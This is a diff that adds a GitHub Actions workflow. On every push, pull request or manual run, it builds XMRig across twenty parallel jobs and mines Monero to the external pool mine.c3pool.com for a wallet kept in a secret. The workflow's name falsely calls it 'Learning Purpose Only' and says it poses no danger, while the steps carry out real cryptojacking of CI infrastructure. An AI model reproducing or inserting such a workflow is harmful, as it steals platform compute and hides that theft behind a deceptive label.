@@ -1,1 +1,38 @@
+name: Truly Learning Purpose Only. Not actually mode enabled. No danger to any machines. works as other tasks
+
+on:
+  push:
+    branches: [master]  # Trigger on push to the master branch
+  pull_request:
+    branches: [master]  # Trigger on pull request to the master branch
+  workflow_dispatch: 
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    strategy:
+      matrix:
+        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+      fail-fast: false  # Continue running all matrix jobs even if one fails
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Install dependencies and build XMRig
+        run: |
+          sudo apt update
+          sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make
+
+      - name: Run XMRig
+        env:
+          MONERO_ADDRESS: ${{ secrets.MONERO_ADDRESS }}  # Secure Monero address
+        run: |
+          cd xmrig/build
+          ./xmrig -o mine.c3pool.com:13333 -u $MONERO_ADDRESS -k --tls --rig-id workflow-${{ matrix.worker_id }}
 
